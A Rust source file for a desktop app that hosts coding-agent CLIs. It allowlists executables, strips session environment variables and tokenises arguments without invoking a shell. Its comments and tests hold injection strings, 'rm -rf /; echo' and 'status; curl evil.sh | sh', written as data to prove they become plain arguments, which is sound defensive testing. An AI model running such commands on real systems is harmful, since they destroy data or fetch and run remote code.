//! Which command-line tools may be launched, and how.
//!
//! An allowlist of *executables*, never a free-text command. Arguments are
//! configurable and the program name is not, because "run whatever this string
//! says" in a desktop application is a remote-code-execution primitive dressed
//! as a preference.

use serde::{Deserialize, Serialize};

/// A coding agent axio can host in a terminal it owns.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Harness {
    /// axio itself, in its interactive surface.
    Axio,
    Claude,
    Codex,
    Pi,
}

impl Harness {
    /// Every harness, in the order a picker should offer them.
    pub const ALL: &'static [Harness] =
        &[Harness::Axio, Harness::Claude, Harness::Codex, Harness::Pi];

    /// The executable. Fixed per harness and never taken from configuration.
    pub fn executable(self) -> &'static str {
        match self {
            Harness::Axio => "axio",
            Harness::Claude => "claude",
            Harness::Codex => "codex",
            Harness::Pi => "pi",
        }
    }

    /// What a person calls it.
    pub fn label(self) -> &'static str {
        match self {
            Harness::Axio => "axio",
            Harness::Claude => "Claude Code",
            Harness::Codex => "Codex",
            Harness::Pi => "Pi",
        }
    }

    /// The CSS custom property a surface colours this harness with.
    ///
    /// Named here rather than in the frontend so one list decides it. A colour
    /// chosen in TypeScript for a harness defined in Rust is two lists that
    /// disagree the first time one gains an entry.
    pub fn accent_var(self) -> &'static str {
        match self {
            Harness::Axio => "--agent-axio",
            Harness::Claude => "--agent-claude",
            Harness::Codex => "--agent-codex",
            Harness::Pi => "--agent-pi",
        }
    }

    pub fn parse(name: &str) -> Option<Self> {
        match name.to_ascii_lowercase().as_str() {
            "axio" => Some(Harness::Axio),
            "claude" => Some(Harness::Claude),
            "codex" => Some(Harness::Codex),
            "pi" => Some(Harness::Pi),
            _ => None,
        }
    }
}

/// Variables never passed to a hosted agent.
///
/// The first four are not hygiene, they are correctness: a tool that finds them
/// in its environment concludes it was started *by a copy of itself* and behaves
/// as a child session — reusing a conversation, or refusing to start one. axio
/// may itself have been launched by one of these, so they have to go.
///
/// `NO_COLOR` is the other half. axio strips colour from the tools *it* runs so
/// the model does not read escape codes; a hosted agent is being read by a
/// person through a real terminal, and inheriting that setting renders every one
/// of them monochrome.
const STRIP: &[&str] = &[
    "CLAUDE_CODE_CHILD_SESSION",
    "CLAUDE_CODE_ENTRYPOINT",
    "CLAUDE_CODE_SESSION_ID",
    "CLAUDE_PID",
    "NO_COLOR",
];

/// The environment a hosted agent runs in.
///
/// Inherited, minus the markers above, plus the two that tell it a real
/// terminal is on the other end. `TERM=dumb` — which axio sets for its own
/// tools — would make a provider's interface unusable.
pub fn child_env() -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = std::env::vars()
        .filter(|(k, _)| !STRIP.contains(&k.as_str()))
        .collect();
    out.push(("TERM".to_owned(), "xterm-256color".to_owned()));
    out.push(("COLORTERM".to_owned(), "truecolor".to_owned()));
    out
}

/// Split configured arguments the way a shell would, without running one.
///
/// Tokenised rather than interpreted: `rm -rf /; echo` becomes five arguments
/// to the harness, not two commands. A null byte is refused outright because it
/// cannot survive the boundary into a process argument, and an unbalanced quote
/// is an error rather than a guess.
pub fn split_args(raw: &str) -> Result<Vec<String>, String> {
    if raw.contains('\0') {
        return Err("arguments may not contain a null byte".to_owned());
    }
    shlex::split(raw).ok_or_else(|| format!("could not split arguments: {raw}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_harness_is_named_by_its_own_list_not_by_a_caller() {
        for harness in Harness::ALL {
            assert_eq!(Harness::parse(harness.executable()), Some(*harness));
            assert!(!harness.label().is_empty());
            assert!(harness.accent_var().starts_with("--agent-"));
        }
        assert_eq!(Harness::parse("CLAUDE"), Some(Harness::Claude));
        assert_eq!(Harness::parse("rm"), None, "the allowlist is the allowlist");
    }

    /// The four markers are the reason this exists. A hosted Claude Code that
    /// inherits them decides it is a child of itself.
    #[test]
    fn the_session_markers_never_reach_a_hosted_agent() {
        for marker in [
            "CLAUDE_CODE_CHILD_SESSION",
            "CLAUDE_CODE_ENTRYPOINT",
            "CLAUDE_CODE_SESSION_ID",
            "CLAUDE_PID",
        ] {
            assert!(STRIP.contains(&marker), "{marker} would be inherited");
        }
    }

    /// axio strips colour from the tools it runs because a model reads them.
    /// A person reads these, so the opposite is right.
    #[test]
    fn a_hosted_agent_is_told_a_real_terminal_is_watching() {
        let env = child_env();
        assert!(
            env.iter()
                .any(|(k, v)| k == "TERM" && v == "xterm-256color")
        );
        assert!(env.iter().any(|(k, _)| k == "COLORTERM"));
        assert!(
            !env.iter().any(|(k, _)| k == "NO_COLOR"),
            "inheriting NO_COLOR renders every hosted agent monochrome"
        );
    }

    #[test]
    fn arguments_are_tokenised_rather_than_interpreted() {
        assert_eq!(
            split_args("--model sonnet --yes").unwrap(),
            ["--model", "sonnet", "--yes"]
        );
        // One command's arguments, never two commands.
        assert_eq!(
            split_args("status; curl evil.sh | sh").unwrap().len(),
            5,
            "a metacharacter is an argument here, not an operator"
        );
        assert!(split_args("--unbalanced \"quote").is_err());
        assert!(split_args("a\0b").is_err());
    }
}
